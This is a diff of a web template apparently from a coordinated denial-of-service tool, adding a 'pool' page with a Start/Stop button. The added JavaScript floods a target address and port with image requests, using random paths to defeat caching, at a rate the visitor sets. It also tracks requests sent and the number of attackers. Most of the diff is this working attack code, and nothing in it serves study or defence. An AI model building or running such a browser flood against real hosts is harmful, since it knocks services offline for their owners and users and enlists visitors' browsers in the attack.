@@ -1,15 +1,49 @@
 {% extends "base.html" %}
 
 {% block content %}
-<div id=poolID>
-        Pool-ID:{{pool.id}}
-        Pool-Name:{{pool.name}}
-        Pool-Target:{{pool.target_address}}
-        Pool-RPM:{{pool.rpm}}
+<h2>{{pool.name}}</h1>
+
+<div id='pool-target'>Target: {{pool.target_address}} </div>
+<div id='pool-comment'>Comment: {{pool.comment}}</div>
+<div id='pool-rpm' >RPM: <div style="display: inline;" id='rpm'>{{pool.rpm}}</div> </div>
+<div id='pool-name'>Number Attackers {{pool.number_attackers}}</div>
+
+<input id='speed' type="number">
+<button id='startbtn'>Start</button>
+
 </div>
 
-<div>
+{% endblock %}
 
-</div>
 
+{% block script %}
+<script>
+
+var rpm = window.document.getElementById('rpm')
+
+function attack(){
+  var domain = '{{pool.target_address}}';
+  var img = document.createElement('img');
+  img.setAttribute('src', domain  + ':' + '{{pool.port}}' + '/image' + new Date().getTime() + Math.floor(Math.random() * 10 ));
+  //document.body.appendChild(img);
+  rpm.innerText = parseInt(rpm.innerText) + 1
+
+}
+let attackInterval;
+window.document.getElementById('startbtn').onclick = function(){
+var speed = window.document.getElementById('speed').value
+var btn = window.document.getElementById('startbtn')
+
+  if (btn.innerText == 'Start'){
+  btn.innerText = 'Stop'
+
+   attackInterval = setInterval(attack, 1000/speed)
+   
+  }else{
+    clearInterval(attackInterval)
+
+    btn.innerText = 'Start'
+  }
+}
+</script>
 {% endblock %}
